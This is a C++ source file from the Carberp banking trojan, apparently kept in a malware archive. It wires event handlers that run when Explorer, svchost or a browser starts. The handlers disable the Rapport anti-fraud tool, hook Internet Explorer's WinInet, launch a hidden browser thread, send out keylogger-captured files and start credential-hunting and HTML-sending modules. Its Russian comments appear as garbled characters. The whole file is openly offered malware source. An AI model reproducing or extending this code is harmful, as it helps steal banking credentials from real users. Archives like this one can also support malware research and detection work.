/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "BotDebug.h"
#include "Strings.h"
#include "Utils.h"
#include "Modules.h"
#include "Loader.h"
//---------------------------------------------------------------------------


void ExplorerFirstStart(PEventData Data)
{

	#ifdef antirapportH 
		RapportOldKill();
	#endif

	// ������ ������ ���� � ����������

	// ��������� �������� �������
	/* #ifdef coocksolH
		StartDeleteCookiesThread();
    #endif */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{
	// ������� ����������

	// ������ ���������� WinInet
	#ifdef InternetExplorerH
		HookInternetExplorer();
	#endif

	// ������ ������ �������� ��������.
	// �����! ����� ������ ���������� � ��������� �������
	#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// ��������� ����� ����������� �� ������ ��������
		pWaitForSingleObject(H, INFINITE);
	#endif
}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// �������� ������� ���������� � �������� svchost
	
	//������ ������� �� ������� , ��������� ��� � 15 ��� ���� �������� �������,�� ��������� ������� SB
	#ifdef __keylogger_h__	
		SendLoadedFiles();
	#endif
	#ifdef HunterH
		StartHunt();		
	#endif


}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// ������� Internet Explorer. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// ������� �������. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// ������� ��������� �������. ��������� ����� ������� � ������� ��������
	#ifdef HTMLSendH
		InitHTMLSendHandlers();
	#endif;
}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// �������� ����������� ����������

}
//---------------------------------------------------------------------------

